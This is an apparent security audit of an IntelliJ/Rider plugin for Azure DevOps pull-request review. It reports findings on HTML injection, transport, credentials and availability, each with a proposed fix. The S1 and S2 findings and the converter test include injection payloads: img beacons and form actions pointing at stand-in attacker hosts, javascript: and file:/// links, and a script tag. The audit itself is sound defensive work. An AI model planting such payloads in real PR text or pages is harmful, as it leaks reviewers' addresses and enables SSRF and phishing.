# Security findings

Reviewed on 2026-10-20 against `origin/master` (`eaf1dce`). Severity: critical, high, medium, low. Everything marked **verified** was read from code or produced by a command in this checkout; **UNVERIFIED** items are reasoning that was not tested.

Summary: 0 critical, 0 high, 2 medium, 6 low, 3 informational.

## Checks run

| Check | Result |
|---|---|
| Secret scan of the full git history (`git log --all -p`, token-shaped strings of 52 or 84 characters) | No PAT-shaped string. One Base64-looking value is a Graph `descriptor` in `src/test/resources/fixtures/azdo/subject-query.json`, which is an encoded GUID, not a credential. |
| Grep of tracked files for `pat =`, `token =`, `password` | Only the `PasswordSafe` code, comments and the live test reading `AZDO_PAT` from the environment. |
| Kotlin compiler warnings (`./gradlew test --rerun-tasks --warning-mode all`) | None printed. BUILD SUCCESSFUL in 25 s. |
| Dependency audit | No audit tool is configured (no OWASP dependency-check or similar) and Gradle has none built in, so **not available**. Resolved test classpath: `org.junit.jupiter:*:6.1.3`, `org.junit.platform:*:6.1.3`, `org.opentest4j:1.3.0`. The plugin bundles no runtime dependency; the IDE supplies kotlin stdlib, coroutines, kotlinx.serialization and the Markdown converter. |
| Plugin verifier (`./gradlew buildPlugin verifyPlugin -PplatformLocalPath=/Applications/Rider.app`) | `io.github.antomys.azdoprreview:0.1.0 against RD-262.10315.191: Compatible`. BUILD SUCCESSFUL in 39 s. |
| JDK `HttpClient` defaults (jshell, JBR 21) | `followRedirects=NEVER`, `version=HTTP_2`. The PAT is therefore never replayed to a redirect target. |
| Markdown converter behaviour (temporary JUnit test calling `com.intellij.markdown.utils.convertMarkdownToHtml`) | Input `Hi <img src="http://evil.example/t.png"> <a href="file:///etc/hosts">x</a> [js](javascript:alert(1)) <form action="http://evil.example/f"><input type="submit"></form> <script>alert(1)</script>` produced `<p>Hi <img src="http://evil.example/t.png"> <a href="file:///etc/hosts">x</a> <a href="#">js</a> … <form action="http://evil.example/f"><input type="submit"></form> <script>alert(1)</script></p>`. Raw HTML passes through unchanged; only Markdown-syntax links get safe-link filtering. |

## Findings

### S1 — Raw HTML in Markdown is rendered by `JEditorPane` (medium, XSS / data exposure)

- **Where:** `src/main/kotlin/io/github/antomys/azdoprreview/ui/MarkdownPane.kt:19,25,28`
- **Evidence (verified):**
  ```kotlin
  editorKit = HTMLEditorKitBuilder().withWordWrapViewFactory().build()
  …
  addHyperlinkListener(BrowserHyperlinkListener.INSTANCE)
  …
  text = convertMarkdownToHtml(markdown)
  ```
  and the converter output above. `MarkdownPane` shows the PR description (`PullRequestDetailsPanel.kt:164`, `TimelinePanel.kt:96`) and every comment body (`ThreadPanel.kt:163`, `DraftPanel.kt:63`).
- **Exploit scenario:** any user who can write a PR description or comment in the organization embeds `<img src="http://attacker.example/beacon?pr=1">`. When a reviewer opens the PR in Rider, Swing's `HTMLEditorKit` `ImageView` fetches the URL from the reviewer's machine (no click needed): the attacker learns the reviewer's IP address and when they looked, and can send GET requests to hosts reachable from the developer's network (blind SSRF). `<a href="file:///…">` or deceptive `<a href="https://phish…">` links open through `BrowserUtil.browse` on click; `<form action="http://attacker">` submits on click. No script execution: Swing does not run JavaScript. The PAT is not sent with these requests.
- **Proposed fix:** sanitise the generated HTML in `MarkdownPane` before setting it: keep an allow-list of tags the converter emits for Markdown (`p, br, strong, em, b, i, s, del, code, pre, ul, ol, li, blockquote, h1–h6, hr, a, table, thead, tbody, tr, th, td, input` for task lists), keep only `href` on `a` and only when it starts with `http://`, `https://` or `mailto:`, drop `img` (its remote fetch is the leak; attachment images need the PAT and never rendered anyway), and escape every other tag as text so the author's raw markup shows literally. Add a unit test that feeds the string above through the pane's conversion and asserts no `<img`, `<form`, `<script` and no `file:` href survive, and that normal Markdown (bold, code, link, list) still renders.

### S2 — Server strings starting with `<html>` are rendered as HTML by Swing labels and tooltips (medium, HTML injection / data exposure)

- **Where (verified):**
  - `toolwindow/PullRequestListPanel.kt:254` `title.text = value.title` (PR title, every row of the list)
  - `toolwindow/PullRequestListPanel.kt:263` `toolTipText = value.labels.joinToString()` (label names)
  - `toolwindow/PullRequestDetailsPanel.kt:129-133` branch names in a `JBLabel` and its tooltip
  - `toolwindow/PullRequestDetailsPanel.kt:170` reviewer display name
  - `timeline/TimelinePanel.kt:124` `JBLabel("<html><b>${author.displayName}</b> …")` (explicit HTML, name not escaped)
  - `timeline/TimelinePanel.kt:133` system-event text, which begins with the actor's display name
  - `ui/ThreadPanel.kt:155` comment author display name
- **Evidence:** `JLabel` and `JToolTip` interpret text that starts with `<html>` as HTML (Swing `BasicHTML`), and `JBLabel` keeps that behaviour. PR titles, branch names (`<` and `>` are legal in git ref names) and labels are set by any PR author; display names by the user themselves.
- **Exploit scenario:** a PR titled `<html><img src="http://attacker.example/b">` makes every reviewer's IDE fetch the beacon as soon as the list renders, with no interaction. The timeline line `<b>Name</b>` renders any HTML a user puts in their display name.
- **Proposed fix:** on labels that show server text call `putClientProperty("html.disable", true)` (Swing's documented switch); in `TimelinePanel.item` escape the name with `StringUtil.escapeXmlEntities` before building the `<html>` string; for the two tooltips build `"<html>" + escapeXmlEntities(text)` so a leading `<html>` from the server is inert. Test: a unit test on a small helper (for example `plainLabel(text)`) is enough if the helper is used at each sink; otherwise cover with a headless Swing test asserting `label.getClientProperty("html.disable") == true` and that `BasicHTML.isHTMLString` output is not used.

### S3 — `Retry-After` is honoured without an upper bound (low, transport)

- **Where:** `azdo/AzureDevOpsClient.kt:57-58`
- **Evidence (verified):**
  ```kotlin
  val retryAfter = response.headers().firstValue("Retry-After").orElse(null)?.toLongOrNull()
  if (retryAfter != null) nextRequestAt.set(clock() + retryAfter * 1000)
  ```
- **Scenario:** a `Retry-After: 86400` (or an overflowing value) from the service stalls every request of the client, with no error shown, until the IDE restarts. Only Azure DevOps can send the header, so this is a robustness issue rather than an attack.
- **Fix:** cap the wait (for example 60 s) and ignore negative values. Backlog.

### S4 — Default JDK TLS context instead of the IDE's certificate manager (low, transport, UNVERIFIED)

- **Where:** `azdo/AzureDevOpsClient.kt:30` `HttpClient.newBuilder().connectTimeout(…).build()`
- **Evidence:** no custom `SSLContext`, trust manager or hostname verifier anywhere in `src/main` (grep), so certificate verification is the JDK default and is not weakened. Whether the IDE installs its `CertificateManager` as the JVM default context, so that user-accepted corporate CAs apply, was not tested.
- **Fix:** none needed for security. If users behind TLS-inspecting proxies report failures, build the client with `CertificateManager.getInstance().sslContext`. Backlog.

### S5 — Service-provided ids interpolated into URL paths without encoding (low, injection, defence in depth)

- **Where:** `azdo/AzureDevOpsProvider.kt:143` (`/reviewers/$me`), `:154` (`/reviewers/${user.id}`), `:193` (`/teams/${team.id}/members`)
- **Evidence (verified):** project and repository names go through `encode()` (`:345`), thread and comment ids are `Int`, but reviewer and team ids are raw strings. They come from the service (`connectionData`, PR reviewers, Graph storage keys, team list), never from user input, and are GUIDs in every recorded fixture.
- **Fix:** wrap them in `encode()`; no behaviour change for GUIDs. Backlog.

### S6 — PAT copies kept in memory (low, credentials)

- **Where:** `settings/AzureDevOpsConnection.kt:17,32-34` keeps `pat` in `Cached` to detect a changed token; `settings/AzureDevOpsConfigurable.kt:17,41` holds the typed token in `newPat` until apply.
- **Evidence (verified):** the token is only ever written to `PasswordSafe` (`AzureDevOpsAccount.kt:33`), the persisted `AccountState` holds the organization only, there is no logging in `src/main`, and `AzureDevOpsClientTest` asserts that exception text and `client.toString()` contain neither the PAT nor its Base64 form.
- **Residual:** the Base64 header in `AzureDevOpsClient` is unavoidable; the second plain copy in `Cached` could be replaced by a hash. Changing the organization leaves the old organization's PAT in the keychain. Backlog.

### S7 — Organization name is not validated (low, injection)

- **Where:** `azdo/AzureDevOpsClient.kt:82-83` `"https://dev.azure.com/$organization"`.
- **Evidence (verified by URI syntax):** the value lands after the first `/`, so it can only alter the path, query or fragment, never the host; a syntactically invalid value makes `URI(url)` throw and the list shows the error. The value is typed by the user in their own settings, so there is no attacker.
- **Fix:** optional `[A-Za-z0-9-]+` validation in the settings page for a clearer error. Backlog.

### S8 — Response bodies and diff contents are unbounded (low, availability)

- **Where:** `azdo/AzureDevOpsClient.kt:53` `BodyHandlers.ofByteArray()`, `diff/PullRequestDiff.kt:104,113-114` loads both sides of a file fully and calls `decodeToString()`.
- **Scenario:** a PR containing a very large file makes the diff load hundreds of MB into memory. Only the configured service can produce such a response.
- **Fix:** cap file content shown in the diff (for example 10 MB, then show a "too large" request). Backlog; changes what the diff shows for huge files.

## Informational

- **I1 — AI review path:** not implemented. No code sends diff or file content anywhere but the configured Azure DevOps organization; there is no consent dialog to review because there is nothing to consent to. The mitigations in `docs/risks.md` R5 remain requirements for when it is built.
- **I2 — Permissions:** `plugin.xml` depends only on `com.intellij.modules.platform` and registers one tool window, one configurable, one diff extension and one file editor provider. Nothing unnecessary.
- **I3 — Path traversal / temp files:** no file system writes in `src/main` (grep for `java.io.File`, `java.nio.file`, `createTempFile`: no hits). Diff content is shown from memory through `DiffContentFactory`.
